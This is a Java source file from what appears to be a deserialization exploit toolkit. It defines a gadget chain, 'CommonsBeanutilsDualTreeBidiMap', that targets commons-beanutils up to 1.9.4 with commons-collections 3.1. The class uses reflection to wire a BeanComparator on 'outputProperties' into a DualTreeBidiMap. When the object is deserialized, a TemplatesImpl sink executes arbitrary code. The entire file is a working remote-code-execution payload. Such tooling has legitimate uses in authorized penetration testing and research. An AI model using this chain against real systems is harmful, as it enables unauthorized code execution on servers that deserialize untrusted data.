package com.ppp.chain.commonsbeanutils;

import com.ppp.ObjectPayload;
import com.ppp.annotation.Authors;
import com.ppp.annotation.Dependencies;
import com.ppp.secmgr.PayloadRunner;
import com.ppp.sinks.SinkScheduler;
import com.ppp.sinks.SinksHelper;
import com.ppp.sinks.annotation.Sink;
import com.ppp.utils.Reflections;
import org.apache.commons.beanutils.BeanComparator;
import org.apache.commons.collections.bidimap.DualTreeBidiMap;

import java.util.HashMap;
import java.util.Map;

/**
 * @author Whoopsunix
 */
@Dependencies({"commons-beanutils:commons-beanutils:<=1.9.4", "commons-collections:commons-collections:3.1"})
@Authors({Authors.Y4ER})
@Sink({Sink.TemplatesImpl})
public class CommonsBeanutilsDualTreeBidiMap implements ObjectPayload<Object> {

    public static void main(String[] args) throws Exception {
        PayloadRunner.run(CommonsBeanutilsDualTreeBidiMap.class, args);
    }

    public Object getObject(SinksHelper sinksHelper) throws Exception {
        // sink
        Object sinkObject = SinkScheduler.builder(sinksHelper);

        Object kickOffObject = getChain(sinkObject);

        return kickOffObject;
    }

    public Object getChain(Object templates) throws Exception {
        final BeanComparator comparator = new BeanComparator(null, String.CASE_INSENSITIVE_ORDER);

        DualTreeBidiMap dualTreeBidiMap = new DualTreeBidiMap();
        HashMap<Object, Object> map = new HashMap<Object, Object>();
        map.put(templates, templates);

        Reflections.setFieldValue(dualTreeBidiMap, "comparator", comparator);
        Reflections.setFieldValue(comparator, "property", "outputProperties");
        Map[] maps = (Map[]) Reflections.getFieldValue(dualTreeBidiMap, "maps");
        maps[0] = map;

        return dualTreeBidiMap;
    }
}
